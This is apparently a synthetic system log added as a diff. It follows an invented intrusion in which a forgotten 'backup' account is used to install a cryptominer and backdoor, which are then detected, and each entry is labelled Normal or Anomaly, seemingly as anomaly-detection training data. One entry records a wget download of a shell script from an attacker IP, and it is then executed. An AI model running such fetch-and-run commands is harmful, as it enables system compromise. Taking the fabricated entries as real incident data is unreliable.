@@ -1,0 +1,139 @@
+Context:
+Na de mislukte root-loginpogingen uit jouw anomalie logs, lukt het een aanvaller om via een vergeten account toegang te krijgen. Vervolgens wordt er een cryptominer en backdoor geïnstalleerd, die uiteindelijk gedetecteerd en geblokkeerd worden.
+
+# ===== CONTINUED LOGS: INCIDENT CASE 1 =====
+
+[Normal]
+2025-03-01 09:44:55 INFO System monitoring process 'auditd' running normally
+
+[Normal]
+2025-03-01 09:45:10 INFO User 'maria' accessed shared directory '/srv/reports/'
+
+[Normal]
+2025-03-01 09:45:21 INFO HTTP GET /api/status 200 OK
+
+[Anomaly]
+2025-03-01 09:45:43 WARNING Repeated failed SSH logins for user 'deploy' from 45.66.12.98 (6 attempts)
+
+[Anomaly]
+2025-03-01 09:46:11 ERROR Suspicious login for user 'backup' from unknown IP 185.201.99.23 (successful)
+
+[Normal]
+2025-03-01 09:46:19 INFO System task 'metrics_collector' started
+
+[Anomaly]
+2025-03-01 09:46:42 WARNING User 'backup' initiated session outside allowed hours (policy violation)
+
+[Anomaly]
+2025-03-01 09:47:03 INFO Unusual command executed by 'backup': 'wget http://185.201.99.23/update.sh'
+
+[Anomaly]
+2025-03-01 09:47:11 ALERT File '/tmp/update.sh' created by user 'backup'
+
+[Anomaly]
+2025-03-01 09:47:25 WARNING Shell script '/tmp/update.sh' executed (PID 4312)
+
+[Anomaly]
+2025-03-01 09:47:30 ERROR Process 'bash /tmp/update.sh' spawned hidden child process 'python3 /tmp/update.py'
+
+[Normal]
+2025-03-01 09:47:52 INFO Disk usage check: /dev/sda1 at 63%
+
+[Anomaly]
+2025-03-01 09:48:03 CRITICAL Process 'python3 /tmp/update.py' consuming 95% CPU
+
+[Anomaly]
+2025-03-01 09:48:21 WARNING Outbound connection request to 185.23.14.55:4444 repeated 15 times
+
+[Normal]
+2025-03-01 09:48:55 INFO Firewall rules reloaded automatically
+
+[Anomaly]
+2025-03-01 09:49:03 ERROR Connection attempt blocked by firewall rule 'OUTBOUND_BLACKLIST'
+
+[Normal]
+2025-03-01 09:49:11 INFO User 'john' logged in from 192.168.1.23
+
+[Normal]
+2025-03-01 09:49:23 INFO File 'team_notes.txt' accessed by 'john'
+
+[Anomaly]
+2025-03-01 09:49:30 WARNING Unauthorized modification attempt on '/etc/sudoers' by user 'backup'
+
+[Anomaly]
+2025-03-01 09:49:50 ALERT User 'backup' added to sudoers file manually
+
+[Anomaly]
+2025-03-01 09:50:03 CRITICAL User 'backup' executed 'sudo su' successfully
+
+[Normal]
+2025-03-01 09:50:15 INFO Monitoring agent heartbeat received
+
+[Anomaly]
+2025-03-01 09:50:40 WARNING Unknown binary '/usr/bin/minerd' detected (created by root)
+
+[Anomaly]
+2025-03-01 09:51:12 CRITICAL Process 'minerd' started (PID 4399, user root, CPU 99%)
+
+[Anomaly]
+2025-03-01 09:51:31 ALERT Outbound traffic spike: 100 Mbps to pool.crypto-mining.net
+
+[Normal]
+2025-03-01 09:51:59 INFO Disk I/O high, expected due to logging activity
+
+[Anomaly]
+2025-03-01 09:52:03 WARNING Memory usage abnormal: 93%
+
+[Normal]
+2025-03-01 09:52:31 INFO System attempting to auto-scale CPU governor
+
+[Anomaly]
+2025-03-01 09:52:45 ALERT Multiple SSH sessions opened by 'backup' (5 parallel)
+
+[Anomaly]
+2025-03-01 09:53:12 WARNING Cron job '/usr/local/cleanup.sh' replaced by unknown content
+
+[Anomaly]
+2025-03-01 09:53:33 ERROR Suspicious file '/usr/local/cleanup.sh.bak' found containing obfuscated code
+
+[Normal]
+2025-03-01 09:53:51 INFO System backup initiated by schedule
+
+[Anomaly]
+2025-03-01 09:54:02 ALERT Backup process interrupted unexpectedly
+
+[Anomaly]
+2025-03-01 09:54:30 WARNING Unauthorized outbound SSH tunnel established to 91.210.55.77:22
+
+[Normal]
+2025-03-01 09:54:43 INFO Intrusion detection service scanning active connections
+
+[Anomaly]
+2025-03-01 09:55:00 CRITICAL IDS Alert: 'CryptoMiner infection detected' (Severity: HIGH)
+
+[Anomaly]
+2025-03-01 09:55:33 ALERT Terminating processes 'minerd' and 'update.py'
+
+[Normal]
+2025-03-01 09:55:40 INFO Process 'minerd' terminated successfully
+
+[Normal]
+2025-03-01 09:55:51 INFO System resource usage returning to baseline (CPU 35%)
+
+[Normal]
+2025-03-01 09:56:13 INFO Firewall blocking all outgoing connections for user 'backup'
+
+[Normal]
+2025-03-01 09:56:40 INFO User 'backup' account locked
+
+[Normal]
+2025-03-01 09:57:05 INFO Security team notified via syslog alert
+
+[Normal]
+2025-03-01 09:58:00 INFO Incident report #2025-03-01-01 created automatically
+
+[Normal]
+2025-03-01 09:58:25 INFO System integrity verification completed, no remaining threats
+
+[Normal]
+2025-03-01 09:59:00 INFO Normal operations restored
